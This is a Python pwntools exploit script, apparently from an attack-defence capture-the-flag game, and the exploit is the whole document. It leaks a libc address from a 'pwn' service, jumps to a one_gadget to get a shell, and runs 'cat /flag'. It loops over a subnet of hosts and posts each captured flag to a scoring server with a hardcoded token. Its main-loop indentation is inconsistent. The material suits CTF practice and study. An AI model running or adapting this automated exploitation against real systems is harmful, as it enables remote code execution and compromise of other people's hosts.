#-*-coding:utf-8*-
import requests
import random
import re
import time
import json
from pwn import *
from binascii import hexlify as h	

elf=ELF('pwn')
libc=ELF('libc-2.17.so')

def getflag(ip,port):
	r=remote(ip,port)
	r.recvuntil('code: ')
	payload = ''
	payload+= '<'*(0x18+3)
	payload+= '.<.<.<.<.<.'
	payload+= '<'*(0x38+3)
	payload+= ',<,<,<,<,<,'
	r.sendline(payload)
	stderr_addr=int(h(r.recv()),16)
	libc_base=stderr_addr-libc.symbols['_IO_2_1_stderr_']
	#one_gadget=libc_base+0x45216
	one_gadget=libc_base+0x43048
	log.success('stderr_addr='+str(hex(stderr_addr)))
	log.success('libc_base='+str(hex(libc_base)))
	log.success('one_gadget='+str(hex(one_gadget)))
	r.send(p64(one_gadget)[::-1][2:])
	r.sendline('cat /flag')
	return r.recv()

def post(flag):
	url = 'https://172.16.4.1/Common/awd_sub_answer'
	data = {
	'answer':flag,
	'token' : '489b63632ca7c48cfbc3973c799368f7'
	}
	s=requests.post(url=url,data=data,verify=False)
	print s.content
if __name__ == '__main__':
    while(1):
        for i in xrange(10,72):
            ip = '172.16.5.%d' % i
	    port=5069
	    try:
            content = getflag(ip,port)
        	flag = content
            print flag,i
            post(flag)
            time.sleep(5)
        except:
            continue
